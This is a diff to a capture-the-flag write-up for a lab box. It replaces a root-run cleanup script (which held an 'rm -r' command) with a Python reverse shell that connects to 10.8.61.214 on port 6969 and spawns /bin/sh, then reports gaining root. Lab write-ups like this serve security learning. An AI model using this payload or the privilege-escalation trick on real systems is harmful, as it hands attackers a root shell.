@@ -122,13 +122,26 @@ $ export TERM=xterm-256color
 $ stty rows <num> columns <cols>
 ```
 
+**Let's rewrite our python script: we're gonna get a reverse shell and it will be runned as root, as we've seen before**
+
 ```python
 # -*- coding: utf-8 -*-
 #!/usr/bin/env python
-import os
-import sys
-os.system('rm -r /home/cleanup/* ')
+import socket, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.8.61.214", 6969))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+os.system("/bin/sh -i")
 ```
+
+# ![19](images/pyhscr.jpg?raw=true "secsc")
+
++ **And we are root! It was a funny box, we made some important and classical privilege escalation actions and thousands of thanks should go to csenox, the creator of this box!**
+
+# ![20](images/rootflagas.jpg?raw=true "secsc")
+
 
 
 
